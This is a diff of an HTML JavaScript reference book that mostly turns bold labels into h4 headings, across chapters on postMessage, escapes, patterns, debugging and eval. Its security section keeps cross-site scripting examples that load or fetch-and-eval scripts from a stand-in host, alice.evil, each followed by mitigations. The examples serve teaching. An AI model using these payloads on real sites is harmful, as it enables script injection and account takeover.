 console.log(&quot;Hello, World&quot;)&lbrack;(1, 2, 3)&rbrack;.join();
 </pre>
-<p><b>Return statement:</b></p>
+<h4>Return statement:</h4>
 <pre>
 <b>return</b>
   &quot;something&quot;;
@@ -21144,7 +21164,7 @@ export class MyClass {
   test() {}
 }
 </pre>
-<p><b>Using Modules</b></p>
+<h4>Using Modules</h4>
 <p>Importing modules is as simple as specifying their path:</p>
 <pre>
 import greet from &quot;mymodule.js&quot;;
@@ -21377,16 +21397,16 @@ console.log(object);
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h2 id="ch75">Chapter 75: .postMessage() and MessageEvent</h2>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Parameters</b><br/>
+<h4>Parameters</b><br/>
 <b>message</b><br/>
 <b>targetOrigin</b></p>
 <p>transfer &nbsp;&nbsp;&nbsp; optional</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch75-1">Section 75.1: Getting Started</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>What is <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" 
+<h4>What is <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" 
 target="_blank" rel="noopener noreferrer">.postMessage()</a>,
-when and why do we use it</b></p>
+when and why do we use it</h4>
 <p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" 
 target="_blank" rel="noopener noreferrer"><b>postMessage</a> 
 method is a way to safely allow communication between cross-origin scripts.</b></p>
@@ -21404,7 +21424,7 @@ method to communicate between two scripts you have access to.</p>
 the messages be displayed on the child window. The parent/sender page
 will be assumed to be http://sender.com and child/receiver page will be 
 assumed to be http://receiver.com for the example.</p>
-<p><b>Sending messages</b></p>
+<h4>Sending messages</h4>
 <p>In order to send messages to another window, you need to have a
 reference to its <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window" 
 target="_blank" rel="noopener noreferrer">window</a>
@@ -21462,7 +21482,7 @@ the origin of the childWindow object for the message to be send. It is
 possible to use &ast; as a wildcard but is <b>highly recommended</b> to
 avoid using the wildcard and always set this parameter to receiver&apos;s
 specific origin <b>for security reasons</b>.</p>
-<p><b>Receiving, Validating and Processing Messages</b></p>
+<h4>Receiving, Validating and Processing Messages</h4>
 <p>The code under this part should be put in the receiver page, which is
 http://receiver.com for our example.</p>
 <p>In order to receive messages, the 
@@ -21742,7 +21762,7 @@ character code U+000A.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch78-2">Section 78.2: Escape sequence types</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Single character escape sequences</b></p>
+<h4>Single character escape sequences</h4>
 <p>Some escape sequences consist of a backslash followed by a single character.</p>
 <p>For example, in alert("Hello&absol;n&absol;World");, the escape sequence 
 &bsol;n is used to introduce a newline in the string parameter, so that the 
@@ -21795,7 +21815,7 @@ character that follows the backslash. While similar to nonescape sequences,
 where the leading backslash is simply ignored (i.e. &bsol;&bsol;? for ?), they
 are explicitly treated as single character escape sequences inside
 strings as per the specification.</p>
-<p><b>Hexadecimal escape sequences</b></p>
+<h4>Hexadecimal escape sequences</h4>
 <!-- page 384 -->
 <p>Characters with codes between 0 and 255 can be represented with an
 escape sequence where &bsol;&bsol;x is followed by the 2-digit hexadecimal
@@ -21810,7 +21830,7 @@ without distinction.</p>
 <b>var</b> regExp1 = <i>/&lbrack;&bsol;x00-xff&rbrack;/</i>; // <i>matches any character between U+0000 and U+00FF</i>
 <b>var</b> regExp2 = <i>/&lbrack;&bsol;x00-xFF&rbrack;/</i>; // <i>same as above</i>
 </pre>
-<p><b>4-digit Unicode escape sequences</b></p>
+<h4>4-digit Unicode escape sequences</h4>
 <p>Characters with codes between 0 and 65535 (216 - 1) can be represented
 with an escape sequence where &bsol;&bsol;u is followed by the 4-digit
 hexadecimal character code.</p>
@@ -21824,7 +21844,7 @@ escape sequence for it would be &bsol;u2192.</p>
 <p>For hex digits above 9, the letters a to f are used, in lowercase or
 uppercase without distinction. Hexadecimal codes shorter than 4 digits
 must be left-padded with zeros: &bsol;&bsol;u007A for the small letter &quot;z&quot;.</p>
-<p><b>Curly bracket Unicode escape sequences</b></p>
+<h4>Curly bracket Unicode escape sequences</h4>
 <h5>Version ≥ 6</h5>
 <p>ES6 extends Unicode support to the full code range from 0 to 0x10FFFF.
 In order to escape characters with code greater than 216 - 1, a new
@@ -21844,7 +21864,7 @@ above 9, the letters a to f are used, in lowercase or uppercase
 without distinction.</p>
 <p>Unicode escape sequences with curly braces only work inside strings,
 not inside regular expressions!</p>
-<p><b>Octal escape sequences</b></p>
+<h4>Octal escape sequences</h4>
 <p>Octal escape sequences are deprecated as of ES5, but they are still
 supported inside regular expressions and in non-strict mode also
 inside non-template strings. An octal escape sequence consists of one,
@@ -21921,7 +21941,7 @@ addEventListener</a> then you&apos;ve utilized the Observer pattern.</p>
   };
 }
 </pre>
-<p><b>Example usage:</b></p>
+<h4>Example usage:</h4>
 <pre>
 <b>function</b> Employee(name) {
   <b>this</b>.name = name;
@@ -22037,7 +22057,7 @@ code to use to execute the command.</p>
     process, callback, or any way needed to execute the command.</li>
   <li>Receiver - the target of the command execution.</li>
 </ol>
-<p><b>Command Message as an Array</b></p>
+<h4>Command Message as an Array</h4>
 <pre>
 <b>var</b> aCommand = <b>new</b> Array();
 aCommand.push(<b>new</b> Instructions().DoThis); // <i>Method to execute</i>
@@ -22062,7 +22082,7 @@ class DoThis {
 }
 </pre>
 <!-- page 389 -->
-<p><b>Invoker</b></p>
+<h4>Invoker</h4>
 <pre>
 aCommand.Execute();
 </pre>
@@ -22075,7 +22095,7 @@ aCommand.Execute();
   <li>at the end of an event loop</li>
   <li>in any other needed way to invoke a method</li>
 </ul>
-<p><b>Receiver</b></p>
+<h4>Receiver</h4>
 <pre>
 class Instructions {
   DoThis( stringArg, numArg, objectArg, arrayArg ) {
@@ -22092,7 +22112,7 @@ with companion patterns to create messaging patterns.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>An iterator pattern provides a simple method for selecting,
 sequentially, the next item in a collection.</p>
-<p><b>Fixed Collection</b></p>
+<h4>Fixed Collection</h4>
 <pre>
 class BeverageForPizza { 
   constructor(preferenceRank) {
@@ -22126,7 +22146,7 @@ collection</p>
   }
 }
 </pre>
-<p><b>As a Generator</b></p>
+<h4>As a Generator</h4>
 <pre>
 class FibonacciIterator {
   constructor() {
@@ -22269,7 +22289,7 @@ async <b>function</b> getJSON(url) {
 </pre>
 <p>An async function always returns a Promise itself, so you can use it
 in other asynchronous functions.</p>
-<p><b>Arrow function style</b></p>
+<h4>Arrow function style</h4>
 <pre>
 <b>const</b> getJSON = async url =&gt; {
   <b>const</b> response = await fetch (url);
@@ -22889,7 +22909,7 @@ presented as numeric value 1 and <b>false</b> as 0</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>We can use ~ as a shorthand in some everyday scenarios.</p>
 <p>We know that ~ converts -1 to 0, so we can use it with indexOf on array.</p>
-<p><b>indexOf</b></p>
+<h4>indexOf</h4>
 <pre>
 <b>let</b> items = &lbrack;&apos;foo&apos;, &apos;bar&apos;, &apos;baz&apos;&rbrack;;
 <b>let</b> el = &apos;a&apos;;
@@ -22900,7 +22920,7 @@ presented as numeric value 1 and <b>false</b> as 0</p>
 <pre>
 <b>if</b> (items.indexOf(&apos;a&apos;) &gt;= 0) {}
 </pre>
-<p><b>can be re-written as</b></p>
+<h4>can be re-written as</h4>
 <pre>
 <b>if</b> (&bsol;~items.indexOf(&apos;a&apos;)) {}
 </pre>
@@ -23693,7 +23713,7 @@ When I search for <a href="https://example.com/search?q=%3Cscript+src+=+%22https
 cute puppies</a>, nothing happens!
 </blockquote>
 <p>Than Alice successfully gets Bob to run her script while Bob is logged on to his account.</p>
-<p><b>Mitigation:</b></p>
+<h4>Mitigation:</h4>
 <ol type="1" start="1">
   <li>Escape all angle brackets in searches before returning the search
     term when no results are found.</li>
@@ -23735,7 +23755,7 @@ profile, instead of seeing</p>
 <b>&lt;script</b> src = &quot;https://alice.evil/profile_xss.js&quot;<b>&gt;&lt;/script&gt;</b>I&apos;m actually too lazy to write something here.
 </pre>
 <p>Whenever someone visits her profile, they get Alice&apos;s script run on Bob&apos;s website while logged on as their account.</p>
-<p><b>Mitigation</b></p>
+<h4>Mitigation</h4>
 <ol type="1" start="1">
   <li>Escape angle brackets in profile descriptions, etc.</li>
   <li>Store profile descriptions in a plain text file that is then fetched
@@ -23781,9 +23801,11 @@ I like pie &quot;);fetch(&quot;https:// <i>alice.evil/js_xss.js&quot;).then(x=&g
 <pre>
 addMessage(&quot;I like pie &quot;);fetch(&quot;https://alice.evil/js_xss.js&quot;).then(x=&gt;x.text()).then(eval);// <i>&quot;);</i>
 </pre>
+
 <p>That adds the message I like pie, but it also <b>downloads and runs
 <b>https:<i>// alice.evil/js_xss.js</i></b> whenever someone visits Bob&apos;s site.</b></p>
-<p><b>Mitigation:</b></p>
+<h4>Mitigation:</h4>
+
 <ol type="1" start="1">
   <li>Pass the message posted into JSON.stringify()</li>
   <li>Instead of dynamically building a script, build a plain text file
@@ -23851,7 +23873,7 @@ XSS.&quot;
 })
 </pre>
 <p>If you don&apos;t think that&apos;s a problem, paste that in your console and see what happens.</p>
-<p><b>Mitigation</b></p>
+<h4>Mitigation</h4>
 <ul>
   <li><b>Use JSON.parse instead of eval to get JSON.</b> In general, don&apos;t use
     eval, and definitely don&apos;t use eval with something a user could
@@ -23888,7 +23910,7 @@ be safely used to enable cross-origin communication.</p>
 another window, which will be able to intercept it with its onmessage
 event handler, elaborate it, and, if necessary, send a response back
 to the sender window using postMessage() again.</p>
-<p><b>Example of Window communicating with a children frame</b></p>
+<h4>Example of Window communicating with a children frame</h4>
 <ul>
   <li>Content of http:// <i>main-site.com/index.html</i>:
 <pre>
@@ -23956,7 +23978,7 @@ Node JS.)</p>
 from other sources using the following methods. Please do note that
 some of them may present hacks or workarounds instead of solutions
 production system should rely on.</p>
-<p><b>Method 1: CORS</b></p>
+<h4>Method 1: CORS</h4>
 <p>Most public APIs today allow developers to send data bidirectionally between client 
 and server by enabling a feature called CORS (Cross-Origin Resource Sharing). The browser 
 will check if a certain HTTP header (Acess-Control-Allow-Origin) is set and that the 
@@ -23964,7 +23986,7 @@ requesting site&apos;s domain is listed in the header&apos;s value. If it is, th
 the browser will allow establishing AJAX connections.</p>
 <p>However, because developers cannot change other servers&apos; response
 headers, this method can&apos;t always be relied on.</p>
-<p><b>Method 2: JSONP</b></p>
+<h4>Method 2: JSONP</h4>
 <p><b>JSON</b> with <b>P</b>adding is commonly blamed to be a workaround. It is
 not the most straightforward method, but it still gets the job done.
 This method takes advantage of the fact that script files can be
@@ -24414,14 +24436,14 @@ execution and inspecting the contents of your variables.</p>
   <li>From the browser, using the Developer Tools.</li>
   <li>From an Integrated Development Environment (IDE).</li>
 </ol>
-<p><b>Debugger Statement</b></p>
+<h4>Debugger Statement</h4>
 <p>You can place a debugger; statement anywhere in your JavaScript code. Once the
 JS interpreter reaches that line, it will stop the script execution,
 allowing you to inspect variables and step through your code.</p>
-<p><b>Developer Tools</b></p>
+<h4>Developer Tools</h4>
 <p>The second option is to add a breakpoint directly into the code from
 the browser&apos;s Developer Tools.</p>
-<p><b>Opening the Developer Tools</b></p>
+<h4>Opening the Developer Tools</h4>
 <b>Chrome or Firefox</b>
 <ol type="1" start="1">
   <li>Press F12 to open Developer Tools</li>
@@ -24429,21 +24451,21 @@ the browser&apos;s Developer Tools.</p>
   <li>Press Ctrl + P and type the name of your JavaScript file</li>
   <li>Press Enter to open it.</li>
 </ol>
-<p><b>Internet Explorer or Edge</b></p>
+<h4>Internet Explorer or Edge</h4>
 <ol type="1" start="1">
   <li>Press F12 to open Developer Tools</li>
   <li>Switch to the Debugger tab.</li>
   <li>Use the folder icon near the upper-left corner of the window to open
     a file-selection pane; you can find your JavaScript file there.</li>
 </ol>
-<p><b>Safari</b></p>
+<h4>Safari</h4>
 <ol type="1" start="1">
   <li>Press Command + Option + C to open Developer Tools</li>
   <li>Switch to the Resources tab</li>
   <li>Open the &quot;Scripts&quot; folder in the left-side panel</li>
   <li>Select your JavaScript file.</li>
 </ol>
-<p><b>Adding a breakpoint from the Developer Tools</b></p>
+<h4>Adding a breakpoint from the Developer Tools</h4>
 <p>Once you have your JavaScript file open in Developer Tools, you can
 click a line number to place a breakpoint. The next time your program
 runs, it will pause there.</p>
@@ -24451,8 +24473,8 @@ runs, it will pause there.</p>
 Pretty Print it (convert to readable format). In Chrome, this is done
 by clicking on the {} button in the bottom right corner of the source
 code viewer.</p>
-<p><b>IDEs</b></p>
-<p><b>Visual Studio Code (VSC)</b></p>
+<h4>IDEs</h4>
+<h4>Visual Studio Code (VSC)</h4>
 <p>VSC has <a href="https://code.visualstudio.com/docs/editor/debugging">
 built-in support</a> for debugging JavaScript.</p>
 <ol type="1" start="1">
@@ -24461,7 +24483,7 @@ built-in support</a> for debugging JavaScript.</p>
     by pressing the gear icon.</li>
   <li>Run the code from VSC by pressing the green play button or hit F5.</li>
 </ol>
-<p><b>Adding a breakpoint in VSC</b></p>
+<h4>Adding a breakpoint in VSC</h4>
 <p>Click next to the line number in your JavaScript source file to add a
 breakpoint (it will be marked red). To delete the breakpoint, click
 the red circle again.</p>
@@ -24522,7 +24544,7 @@ and <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/F
 at MDN for more information.</p>
 <p>Browser support for setters/getters:</p>
 
-<p><b>Chrome Firefox IE Opera Safari Mobile</b></p>
+<h4>Chrome Firefox IE Opera Safari Mobile</h4>
 <p>Version 1 2.0 9 9.5 3 all</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch99-4">Section 99.4: Using the console</h3>
@@ -24903,7 +24925,8 @@ integers</b>. We can roll these up into something like this:</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h2 id="ch101">Chapter 101: Evaluating JavaScript</h2>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Parameter Details</b><br/>
+<h4>Parameter Details</h4><br/>
+
 string The JavaScript to be evaluated.</p>
 <p>In JavaScript, the eval function evaluates a string as if it were
 JavaScript code. The return value is the result of the evaluated
@@ -24920,8 +24943,8 @@ local scope unless invoked indirectly (e.g. <b>var</b> geval = eval; geval(s);).
 &nbsp;
 console.log(&quot;z is &quot;, eval(str));
 </pre>
-<p><b>The use of eval is strongly discouraged.</b> See the Remarks section
-for details.</p>
+
+<p><b>The use of eval is strongly discouraged.</b> See the Remarks section for details.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch101-2">Section 101.2: Introduction</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -24929,12 +24952,14 @@ for details.</p>
 <b>strongly discouraged</b> due to the security vulnerabilities it
 presents (see Remarks for details).</p>
 <p>To run JavaScript from inside JavaScript, simply use the below function:</p>
+
 <pre>eval(&quot;var a = &apos;Hello, World!&apos;&quot;);</pre>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch101-3">Section 101.3: Evaluation and Math</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p>You can set a variable to something with the eval() function by using
-something similar to the below code:</p>
+<p>You can set a variable to something with the eval() function by using something 
+similar to the below code:</p>
+
 <pre>
 <b>var</b> x = 10;
 <b>var</b> y = 20;
@@ -24944,14 +24969,16 @@ something similar to the below code:</p>
 &nbsp;
 <b>var</b> res = a &plus; b &plus; c;
 </pre>
+
 <p>The result, stored in the variable res, will be:</p>
+
 <blockquote>
 200<br/>
 4<br/>
 27
 </blockquote>
-<p><b>The use of eval is strongly discouraged.</b> See the Remarks section
-for details.</p>
+
+<p><b>The use of eval is strongly discouraged.</b> See the Remarks section for details.</p>
 <!-- page 445 -->
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h2 id="ch102">Chapter 102: Linters - Ensuring code quality</h2>
@@ -25508,7 +25535,7 @@ array always processes better even if it&apos;s doing extra statement.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch104-6">Section 104.6: Reuse objects rather than recreate</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Example A</b></p>
+<h4>Example A</h4>
 <pre>
 <b>var</b> i, a, b, len;
 a = {x: 0, y: 0}
@@ -25534,7 +25561,7 @@ created object is discarded every iteration, Loop B calls test1() that
 requires the object returns to be supplied. It thus uses the same
 object and avoids allocation of a new object, and excessive GC hits.
 (GC were not included in the performance test)</p>
-<p><b>Example B</b></p>
+<h4>Example B</h4>
 <pre>
 <b>var</b> i, a, b, len;
 a = {x: 0, y: 0}
@@ -25635,7 +25662,7 @@ Summing took 384416 nanoseconds
 <pre>
 Summing took 180520 nanoseconds
 </pre>
-<p><b>Summing integers took half the time here.</b></p>
+<h4>Summing integers took half the time here.</h4>
 <p>Engines don&apos;t use the same types you have in JavaScript. As you
 probably know, all numbers in JavaScript are IEEE754 double precision
 floating point numbers, there&apos;s no specific available representation
@@ -25688,8 +25715,8 @@ they have changed in different versions of the language.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="chA-1">Section A.1: Reserved Keywords</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>JavaScript has a predefined collection of <i>reserved keywords</i> which
-you cannot use as variables, labels, or function names.</b></p>
+<h4>JavaScript has a predefined collection of <i>reserved keywords</i> which
+you cannot use as variables, labels, or function names.</h4>
 <h4>ECMAScript 1</h4>
 <h5>Version = 1</h5>
 <table border="1" style="width:200px">
@@ -25763,7 +25790,7 @@ you cannot use as variables, labels, or function names.</b></p>
     </tr>
   </tbody>
 </table>
-<p><b>ECMAScript 2</b></p>
+<h4>ECMAScript 2</h4>
 <p>Added <b>24</b> additional reserved keywords. (New additions in bold).</p>
 
 <h5>Version = 3 Version = E4X</h5>
